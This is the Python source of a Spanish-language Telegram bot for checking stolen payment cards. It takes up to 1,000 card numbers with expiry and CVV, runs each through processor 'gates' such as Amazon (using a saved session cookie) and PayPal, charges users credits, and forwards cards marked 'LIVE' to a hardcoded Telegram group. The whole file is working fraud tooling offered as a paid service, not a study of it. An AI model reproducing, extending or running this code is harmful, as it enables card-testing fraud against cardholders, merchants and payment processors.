import asyncio
import importlib
import traceback
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import ContextTypes

from config import OWNER_ID
from database.db import get_user, has_credits, remove_credits
from utils.bin_utils import get_bin_info
from utils.formatter import format_result
from utils.roles import is_privileged


# 🔔 Grupo donde se mandan los LIVE
LIVE_GROUP_ID = -1002762787906


# ---------------- CONFIG ----------------
executor = ThreadPoolExecutor(max_workers=20)

JULIE_GATES = ["in", "yu", "da"]
AMAZON_GATE = ["amazon"]
GATES = {
    # Julie
    "in": "gates.julie",
    "yu": "gates.julie",
    "da": "gates.julie",

    # Otros
    "redy": "gates.autnet",
    "dely": "gates.parkin",
    "pay": "gates.paypal",
    "dt": "gates.dt",
    "amazon": "gates.amazon",
    
}

MAX_CCS = 1000
COSTO_CREDITOS = 1

STOP_PROCESS = "stop_process"
# ---------------------------------------


def es_owner(user_id: int) -> bool:
    return user_id == OWNER_ID


def tiene_membresia_activa(user: dict) -> bool:
    if user["rank"] != "PREMIUM":
        return False

    expires_at = user["expires_at"]
    if not expires_at:
        return False

    try:
        return datetime.fromisoformat(expires_at) > datetime.now()
    except Exception:
        return False


# ==================================================
# ⛔ CALLBACK BOTÓN DETENER (SOLO ESTE USUARIO)
# ==================================================
async def stop_process_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    context.user_data[STOP_PROCESS] = True

    await query.edit_message_text(
        "⛔ Detención solicitada\n"
        "El proceso se detendrá en breve."
    )


# ==================================================
# 🔥 FUNCIÓN BASE REUTILIZABLE (/in  y  /txt)
# ==================================================
async def procesar_ccs(update, context, cc_list, comando):
    user_id = update.effective_user.id

    # ---------- validar gate ----------
    if comando not in GATES:
        await update.message.reply_text("❌ Gate no válido")
        return

    # ---------- verificar registro ----------
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ No estás registrado\nUsa /register")
        return

    if not cc_list:
        await update.message.reply_text("❌ No se detectaron CC válidas")
        return

    total_ccs = len(cc_list)
    costo_total = total_ccs * COSTO_CREDITOS

    # ---------- verificar créditos / membresía ----------
    if es_owner(user_id) or is_privileged(user_id) or tiene_membresia_activa(user):
        usar_creditos = False
    else:
        usar_creditos = True
        if not has_credits(user_id, costo_total):
            await update.message.reply_text("❌ No tienes créditos suficientes")
            return

    # ---------- descontar créditos ----------
    if usar_creditos:
        remove_credits(user_id, costo_total)

    # ---------- bandera STOP (solo usuario) ----------
    context.user_data[STOP_PROCESS] = False

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("⛔ Detener", callback_data="stop_process")]
    ])

    await update.message.reply_text(
        f"⏳ Procesando {total_ccs} CC en {comando.upper()}...",
        reply_markup=keyboard
    )

    # ---------- cargar gate ----------
    try:
        module = importlib.import_module(GATES[comando])
    except Exception:
        traceback.print_exc()
        await update.message.reply_text("❌ Error cargando el gate")
        return

    loop = asyncio.get_running_loop()

    # ==================================================
    # 🔥 SECUENCIAL POR USUARIO / PARALELO GLOBAL
    # ==================================================
    for cc in cc_list:

        # ⛔ detener SOLO este usuario
        if context.user_data.get(STOP_PROCESS):
            await update.message.reply_text("⛔ Proceso detenido por el usuario")
            break

        try:

            # ⭐ AMAZON REQUIERE COOKIE
            if comando in AMAZON_GATE:
                cookie = context.user_data.get("amazon_cookie")
        
                if not cookie:
                    await update.message.reply_text(
                        "❌ Debes guardar cookie primero\nUsa /cookie"
                    )
                    return
        
                result = await loop.run_in_executor(
                    executor,
                    module.procesar_tarjeta,
                    cc,
                    cookie
                )
        
            elif comando in JULIE_GATES:
                result = await loop.run_in_executor(
                    executor,
                    module.procesar_tarjeta,
                    cc,
                    comando
                )
        
            else:
                result = await loop.run_in_executor(
                    executor,
                    module.procesar_tarjeta,
                    cc
                )
        
        except Exception:
            traceback.print_exc()
            await update.message.reply_text(f"❌ Error procesando {cc}")
            continue

        bin_info = get_bin_info(cc)

        text = format_result(
            result=result,
            gate=comando,
            bin_info=bin_info
        )

        # 📩 RESPUESTA AL USUARIO (SIN MARKDOWN)
        await update.message.reply_text(text)

        # 🔔 SI ES LIVE → MANDAR AL GRUPO
        if str(result.get("status", "")).lower() == "live":
            try:
                await context.bot.send_message(
                    chat_id=LIVE_GROUP_ID,
                    text=text
                )
            except Exception:
                print("Error enviando LIVE al grupo")

        await asyncio.sleep(0.3)

    # limpieza
    context.user_data.pop(STOP_PROCESS, None)


# ==================================================
# 🎯 HANDLER DE COMANDOS DIRECTOS (/in /yu /da)
# ==================================================
async def gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw_text = update.message.text.split(None, 1)
    comando = raw_text[0][1:].lower()

    if len(raw_text) < 2:
        await update.message.reply_text(
            f"Uso:\n/{comando} cc|mm|yy|cvv\nMáx {MAX_CCS} CC"
        )
        return

    cc_list = (
        raw_text[1]
        .replace(",", "\n")
        .splitlines()
    )
    cc_list = [cc.strip() for cc in cc_list if cc.strip()][:MAX_CCS]

    await procesar_ccs(update, context, cc_list, comando)
